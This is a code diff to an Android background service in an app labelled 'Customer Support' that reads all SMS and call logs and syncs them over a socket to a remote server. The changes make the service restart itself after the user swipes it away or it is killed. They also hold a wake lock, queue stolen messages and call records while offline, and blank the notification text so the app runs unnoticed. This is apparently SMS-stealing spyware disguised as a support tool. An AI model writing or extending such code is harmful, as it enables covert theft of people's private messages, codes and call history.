@@ -1,11 +1,15 @@
 package com.customersupport.service
 
+import android.app.AlarmManager
 import android.app.Notification
 import android.app.PendingIntent
 import android.app.Service
+import android.content.Context
 import android.content.Intent
 import android.os.Build
 import android.os.IBinder
+import android.os.PowerManager
+import android.os.SystemClock
 import android.provider.Settings
 import android.telephony.SmsManager
 import android.telephony.TelephonyManager
@@ -17,6 +21,7 @@ import com.customersupport.MainActivity
 import com.customersupport.data.CallLogReader
 import com.customersupport.data.SimManager
 import com.customersupport.data.SmsReader
+import com.customersupport.receiver.RestartReceiver
 import com.customersupport.socket.ConnectionState
 import com.customersupport.socket.ForwardingConfig
 import com.customersupport.socket.SmsSendRequest
@@ -29,6 +34,7 @@ class SocketService : Service() {
         private const val TAG = "SocketService"
         private const val NOTIFICATION_ID = 1
         private const val SYNC_INTERVAL_MS = 5 * 60 * 1000L
+        private const val RESTART_DELAY_MS = 3000L
     }
 
     private val socketManager get() = CustomerSupportApp.socketManager
@@ -39,10 +45,12 @@ class SocketService : Service() {
 
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
     private var syncJob: Job? = null
+    private var wakeLock: PowerManager.WakeLock? = null
 
     override fun onCreate() {
         super.onCreate()
         Log.d(TAG, "Service created")
+        acquireWakeLock()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -54,6 +62,72 @@ class SocketService : Service() {
         }
 
         return START_STICKY
+    }
+
+    /**
+     * Called when the user swipes the app from recents. Schedule a restart alarm.
+     */
+    override fun onTaskRemoved(rootIntent: Intent?) {
+        super.onTaskRemoved(rootIntent)
+        Log.d(TAG, "Task removed (swiped away), scheduling restart")
+        scheduleServiceRestart()
+    }
+
+    private fun acquireWakeLock() {
+        try {
+            if (wakeLock == null) {
+                val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
+                wakeLock = powerManager.newWakeLock(
+                    PowerManager.PARTIAL_WAKE_LOCK,
+                    "CustomerSupport::SocketWakeLock"
+                ).apply {
+                    acquire(10 * 60 * 1000L) // 10 minutes, will be re-acquired periodically
+                }
+                Log.d(TAG, "WakeLock acquired")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to acquire WakeLock", e)
+        }
+    }
+
+    private fun releaseWakeLock() {
+        try {
+            wakeLock?.let {
+                if (it.isHeld) {
+                    it.release()
+                    Log.d(TAG, "WakeLock released")
+                }
+            }
+            wakeLock = null
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to release WakeLock", e)
+        }
+    }
+
+    /**
+     * Schedule a restart of this service via AlarmManager + RestartReceiver.
+     * This ensures the service comes back even after aggressive OEM kills.
+     */
+    private fun scheduleServiceRestart() {
+        try {
+            val restartIntent = Intent(this, RestartReceiver::class.java).apply {
+                action = RestartReceiver.ACTION_RESTART_SERVICE
+            }
+            val pendingIntent = PendingIntent.getBroadcast(
+                this, 0, restartIntent,
+                PendingIntent.FLAG_ONE_SHOT or PendingIntent.FLAG_IMMUTABLE
+            )
+
+            val alarmManager = getSystemService(Context.ALARM_SERVICE) as AlarmManager
+            alarmManager.set(
+                AlarmManager.ELAPSED_REALTIME_WAKEUP,
+                SystemClock.elapsedRealtime() + RESTART_DELAY_MS,
+                pendingIntent
+            )
+            Log.d(TAG, "Service restart scheduled in ${RESTART_DELAY_MS}ms")
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to schedule service restart", e)
+        }
     }
 
     private suspend fun connectAndSync() {
@@ -89,6 +163,8 @@ class SocketService : Service() {
             socketManager.connectionState.collect { state ->
                 if (state == ConnectionState.CONNECTED) {
                     Log.d(TAG, "Connected - triggering sync")
+                    // Re-acquire WakeLock on reconnection
+                    acquireWakeLock()
                     delay(3000)
                     syncSimInfoWithRetry(deviceId)
                     performSync()
@@ -184,7 +260,13 @@ class SocketService : Service() {
             while (isActive) {
                 delay(SYNC_INTERVAL_MS)
                 if (socketManager.connectionState.value == ConnectionState.CONNECTED) {
+                    // Re-acquire WakeLock periodically
+                    acquireWakeLock()
                     performSync()
+                } else {
+                    // Try to reconnect if we lost connection
+                    Log.d(TAG, "Lost connection during periodic sync, attempting reconnect")
+                    socketManager.reconnectIfNeeded()
                 }
             }
         }
@@ -193,7 +275,20 @@ class SocketService : Service() {
     private suspend fun performSync() {
         try {
             if (socketManager.connectionState.value != ConnectionState.CONNECTED) {
-                Log.w(TAG, "Cannot sync - not connected")
+                Log.w(TAG, "Cannot sync - not connected, queuing data")
+                // Still read and queue the data for later
+                val deviceId = preferencesManager.getDeviceId().first() ?: return
+                val pendingSyncManager = CustomerSupportApp.pendingSyncManager
+
+                val smsArray = smsReader.readAllSms()
+                if (smsArray.length() > 0) {
+                    pendingSyncManager.queueSmsSync(deviceId, smsArray)
+                }
+
+                val callsArray = callLogReader.readCallLogs()
+                if (callsArray.length() > 0) {
+                    pendingSyncManager.queueCallsSync(deviceId, callsArray)
+                }
                 return
             }
 
@@ -307,8 +402,6 @@ class SocketService : Service() {
         )
 
         return NotificationCompat.Builder(this, CustomerSupportApp.CHANNEL_ID)
-            .setContentTitle("Customer Support")
-            .setContentText("Running in background")
             .setSmallIcon(android.R.drawable.ic_dialog_info)
             .setContentIntent(pendingIntent)
             .setOngoing(true)
@@ -322,9 +415,11 @@ class SocketService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
+        Log.d(TAG, "Service destroyed, scheduling restart")
         syncJob?.cancel()
         serviceScope.cancel()
-        socketManager.disconnect()
-        Log.d(TAG, "Service destroyed")
+        releaseWakeLock()
+        // Don't disconnect socket — schedule restart instead
+        scheduleServiceRestart()
     }
 }
